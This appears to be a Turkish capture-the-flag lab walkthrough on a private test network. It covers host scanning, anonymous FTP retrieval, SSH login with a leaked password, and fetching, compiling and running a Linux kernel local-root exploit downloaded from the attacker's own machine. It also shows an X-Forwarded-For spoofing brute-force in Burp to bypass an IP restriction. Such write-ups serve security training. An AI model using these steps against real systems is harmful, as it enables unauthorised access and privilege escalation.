### Level1:

- Yerel agda up olan sistemler IP adresi bazinda tespit edilip up.txt isimli dosya icine yazilacak.

- Bu up.txt uzerinden TCP/44321 portu acik sistem tespit edilecek.

- Ilgili port uzerinde bu sistem uzerinde erisim elde edilecek ve hidden.dmp dosyasi elde edilecek

### Level2:

- Hidden.dmp dosyasi icindeki ipucu elde edilip level3'e gecilecek.

### Level3:

- Ipuclari takip edilecek

### Level4:

- Ipuclari takip edilecek.

### START

**HEDEF: 192.168.1.110**

- 44321 portunda anonymous ftp üzerinden hidden.dmp elde edildi.
hidden.dmp icerisinde 191 ip'sine bga bga123 ssh bağlantısı yapılmış. ağdaki 22 portu açık hostları arıyoruz.

		=> ssh bga@192.168.1.125
		ssh password: bga123
		=> cd bga1/
		=> ./exploit
		=> cd root
		=> cat ipucu.txt

- ipucu.txt => V1dWeVpXd2dZY1NmWkdFZ09EQWdjRzl5ZEhVZ1ljT254TEZySUhOcGMzUmxiV3hsY2lCaWRXeDFibUZqWVdzc0lHSjFJSE5wYzNSbGJXeGxjbVJsSUM5amRHWWdZV3dnWkdsNmFXNXBJRzlzWVc0Z2JXRnJhVzVoSUdKMWJIVnVkWEFnWW5WeVlXUmhiaUJEVkVZZ1pHVjJZVzBnWldScGJHVmpaV3N1PT0==
=> Yerel ağda 80 portu açık sistemler bulunacak, bu sistemlerde /ctf al dizini olan makina bulunup buradan CTF devam edilecek.

**HEDEF: 192.168.1.117/ctf**

- Tebrikler CTF baslangic sayfasini buldunuz.
Fakat sistem yalnizca 6.6.6.0/24 subnetindeki bir IP adresinden erisilebilmektedir:

- 192.168.1.137'de access point kurulum sayfasi var!

### ÇÖZÜM

**- ÇÖZÜMDE KULLANMADIĞIM PARAMETRELER & KOMUTLAR:**

		=> nmap -n -v -PN -p 44321 --open -sV -iL up.txt

- Local exploit kullanarak root olmak ve çözümün devamı:

		=> ssh bga@192.168.1.125
		=> uname -a 		(linux kernel 2.6.35-22-generic x86_64)
		
		=> searchsploit	kernel	(linux/local/15704.c)
		=> locate linux/local/15704.c
		=> cp /usr/share/exploitdb/platforms/linux/local/15704.c /var/www/html/
		=> python -m SimpleHTTPServer
		
		=> wget OUR_IP/15704.c
		=> gcc 15704.c -o lolz
		=> ./lolz
		=> cd /root/
		=> cat ipucu.txt
		
		=> base64 decoder 2x
		=> nmap -n -v -PN -iL up.txt -p 80 --open | grep 'report for' | cut -d ' ' -f5 > 80.txt
		=> more 80.txt
		=> wfuzz -c --hc 404,XXX -z file,80.txt http://FUZZ/ctf		(http://192.168.1.117/ctf/)
		=> BurpSuite 	(Proxy -> Intercept -> Options)
		B> 192.168.1.117/ctf
		B> firefox ayarlar > foxyproxy (eklenti) -> 127.0.0.1:8080 -> git
		Burp> Send it to Intruder
		Burp> header'a 3.satira ekle => X-Forwarded-For:6.6.6.$1$
		Burp> payloads -> Numbers -> 1-254 
		Burp> start attacks
		B> LiveHTTPHEADER (firefox eklenti)
		B> 192.168.1.117'ye su sekilde git: header'a ekle => X=Forwarded-For:6.6.6.102
		B> kaynak kodu goruntule, javascript koduna bak.
